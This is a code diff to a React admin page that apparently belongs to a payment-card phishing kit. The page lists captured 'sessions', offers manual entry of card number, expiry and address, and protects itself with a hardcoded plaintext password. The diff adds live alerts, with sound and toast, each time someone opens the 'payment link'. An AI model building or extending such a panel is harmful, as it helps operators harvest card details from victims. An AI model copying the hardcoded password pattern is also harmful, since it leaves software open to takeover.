@@ -1,10 +1,11 @@
-import { useState, useEffect, useMemo } from "react";
+import { useState, useEffect, useMemo, useRef, useCallback } from "react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
-import { Lock, CreditCard, CheckCircle, XCircle, KeyRound, Eye, EyeOff, RefreshCw, Activity, Users, Clock, ShieldCheck, ChevronDown, ChevronUp, Mail, MapPin, Hash } from "lucide-react";
+import { Lock, CreditCard, CheckCircle, XCircle, KeyRound, Eye, EyeOff, RefreshCw, Activity, Users, Clock, ShieldCheck, ChevronDown, ChevronUp, Mail, MapPin, Hash, Wifi, WifiOff, Volume2, VolumeX } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/integrations/supabase/client";
 import { Badge } from "@/components/ui/badge";
+import { playAlertSound } from "@/hooks/use-alert-sound";
 
 const ADMIN_PASSWORD = "Ultimateunique1#";
 
@@ -64,6 +65,9 @@ const Admin = () => {
   const [sessions, setSessions] = useState<any[]>([]);
   const [expandedSession, setExpandedSession] = useState<string | null>(null);
   const [activeTab, setActiveTab] = useState<"form" | "sessions">("sessions");
+  const [visitorCount, setVisitorCount] = useState(0);
+  const [soundEnabled, setSoundEnabled] = useState(true);
+  const prevVisitorCountRef = useRef<number>(0);
   const [form, setForm] = useState({
     cardNumber: "",
     expiry: "",
@@ -77,6 +81,44 @@ const Admin = () => {
     state: "",
     zip: "",
   });
+
+  // Visitor presence tracking
+  useEffect(() => {
+    if (!authenticated) return;
+
+    const channel = supabase.channel("visitors");
+
+    channel
+      .on("presence", { event: "sync" }, () => {
+        const state = channel.presenceState();
+        const count = Object.keys(state).length;
+        const prev = prevVisitorCountRef.current;
+
+        if (count > prev && prev >= 0) {
+          // Someone joined
+          if (soundEnabled) playAlertSound("join");
+          toast({
+            title: "🟢 Visitor joined",
+            description: `Someone opened the payment link. ${count} active visitor${count !== 1 ? "s" : ""}.`,
+          });
+        } else if (count < prev && prev > 0) {
+          // Someone left
+          if (soundEnabled) playAlertSound("leave");
+          toast({
+            title: "🔴 Visitor left",
+            description: `Someone left the payment link. ${count} active visitor${count !== 1 ? "s" : ""}.`,
+          });
+        }
+
+        prevVisitorCountRef.current = count;
+        setVisitorCount(count);
+      })
+      .subscribe();
+
+    return () => {
+      supabase.removeChannel(channel);
+    };
+  }, [authenticated, soundEnabled]);
 
   // Fetch sessions
   const fetchSessions = async () => {
@@ -262,29 +304,61 @@ const Admin = () => {
                 <span className="text-[10px] font-semibold uppercase tracking-widest text-muted-foreground bg-muted px-2 py-0.5 rounded">Admin</span>
               </div>
             </div>
-            <div className="flex items-center gap-1 bg-muted rounded-lg p-1">
+            <div className="flex items-center gap-3">
+              {/* Visitor presence indicator */}
+              <div className={`flex items-center gap-2 px-3 py-1.5 rounded-lg border transition-all ${
+                visitorCount > 0
+                  ? "bg-emerald-50 border-emerald-200 dark:bg-emerald-950/30 dark:border-emerald-800"
+                  : "bg-muted border-border"
+              }`}>
+                {visitorCount > 0 ? (
+                  <Wifi className="h-3.5 w-3.5 text-emerald-600 dark:text-emerald-400 animate-pulse" />
+                ) : (
+                  <WifiOff className="h-3.5 w-3.5 text-muted-foreground" />
+                )}
+                <span className={`text-xs font-semibold tabular-nums ${
+                  visitorCount > 0 ? "text-emerald-700 dark:text-emerald-300" : "text-muted-foreground"
+                }`}>
+                  {visitorCount} online
+                </span>
+              </div>
+              {/* Sound toggle */}
               <button
-                onClick={() => setActiveTab("sessions")}
-                className={`px-3.5 py-1.5 rounded-md text-sm font-medium transition-all ${
-                  activeTab === "sessions"
-                    ? "bg-card text-foreground shadow-sm"
-                    : "text-muted-foreground hover:text-foreground"
-                }`}
+                onClick={() => setSoundEnabled(!soundEnabled)}
+                className="h-8 w-8 rounded-md flex items-center justify-center hover:bg-muted transition-colors"
+                title={soundEnabled ? "Mute alerts" : "Unmute alerts"}
               >
-                <Activity className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
-                Sessions
+                {soundEnabled ? (
+                  <Volume2 className="h-4 w-4 text-foreground" />
+                ) : (
+                  <VolumeX className="h-4 w-4 text-muted-foreground" />
+                )}
               </button>
-              <button
-                onClick={() => setActiveTab("form")}
-                className={`px-3.5 py-1.5 rounded-md text-sm font-medium transition-all ${
-                  activeTab === "form"
-                    ? "bg-card text-foreground shadow-sm"
-                    : "text-muted-foreground hover:text-foreground"
-                }`}
-              >
-                <CreditCard className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
-                Manual Entry
-              </button>
+              {/* Tabs */}
+              <div className="flex items-center gap-1 bg-muted rounded-lg p-1">
+                <button
+                  onClick={() => setActiveTab("sessions")}
+                  className={`px-3.5 py-1.5 rounded-md text-sm font-medium transition-all ${
+                    activeTab === "sessions"
+                      ? "bg-card text-foreground shadow-sm"
+                      : "text-muted-foreground hover:text-foreground"
+                  }`}
+                >
+                  <Activity className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
+                  Sessions
+                </button>
+                <button
+                  onClick={() => setActiveTab("form")}
+                  className={`px-3.5 py-1.5 rounded-md text-sm font-medium transition-all ${
+                    activeTab === "form"
+                      ? "bg-card text-foreground shadow-sm"
+                      : "text-muted-foreground hover:text-foreground"
+                  }`}
+                >
+                  <CreditCard className="h-3.5 w-3.5 inline-block mr-1.5 -mt-0.5" />
+                  Manual Entry
+                </button>
+              </div>
             </div>
           </div>
         </div>
